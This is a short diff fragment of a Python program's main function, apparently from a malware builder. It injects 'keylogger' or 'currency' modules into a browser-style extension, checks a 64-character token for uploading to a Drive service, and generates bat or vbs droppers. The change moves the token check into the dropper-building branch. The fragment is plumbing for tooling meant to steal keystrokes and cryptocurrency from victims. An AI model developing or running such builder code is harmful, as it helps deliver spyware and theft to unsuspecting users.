@@ -57,18 +57,20 @@ def main() :
 
 	download = Download(extension)
 
-	if builds == "bat" or builds == "vbs":
-		builder = Build(extension, builds).builder()
 	if modules == "currency" or modules == "keylogger" :
 		loader = Loader(extension, modules).inject()
 
-	if token:
-		if not len(token) == 64:
-			print("{} Token invalid, enter a valid.".format(color.error("[!]")))
-			sys.exit(1)
-		else :
-			Drive(extension, token).upload()	
-	
+	if builds == "bat" or builds == "vbs":
+		if token:
+			if not len(token) == 64:
+				print("{} Token invalid, enter a valid.".format(color.error("[!]")))
+				sys.exit(1)
+			else :
+				Drive(extension, token).upload()
+		builder = Build(extension, builds, token).builder()
+
+
+
 if __name__== "__main__" :
 
 	main()
